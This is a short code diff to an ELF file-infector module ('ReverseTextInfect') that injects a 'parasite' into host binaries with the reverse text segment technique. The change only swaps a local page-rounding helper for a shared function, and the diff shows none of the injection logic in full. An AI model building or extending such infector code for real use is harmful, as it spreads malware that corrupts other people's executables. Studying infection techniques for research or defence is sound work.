@@ -1,6 +1,7 @@
 #include "infector/reverse_text_infect.hh"
 #include <elf.h>
 #include "common/file_descriptor.hh"
+#include "common/math.hh"
 #include "common/patch_pattern.hh"
 #include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
@@ -8,8 +9,6 @@
 
 namespace vt::infector {
 namespace {
-uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }
-
 bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
                size_t padded_virus_size,
                Elf64_Off original_code_segment_file_offset,
@@ -199,7 +198,7 @@ bool ReverseTextInfect::inject(std::span<std::byte> host_mapping,
   const auto& ehdr =
       *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
 
-  auto padded_virus_size = round_up_to_page(parasite_mapping.size());
+  auto padded_virus_size = common::round_up_to(parasite_mapping.size(), 4096);
 
   {
     const auto& shdr =
@@ -277,7 +276,7 @@ bool ReverseTextInfect::analyze(std::span<const std::byte> host_mapping,
 }
 
 size_t ReverseTextInfect::injected_host_size() {
-  return host_size_ + round_up_to_page(parasite_size_);
+  return host_size_ + common::round_up_to(parasite_size_, 4096);
 }
 
 }  // namespace vt::infector
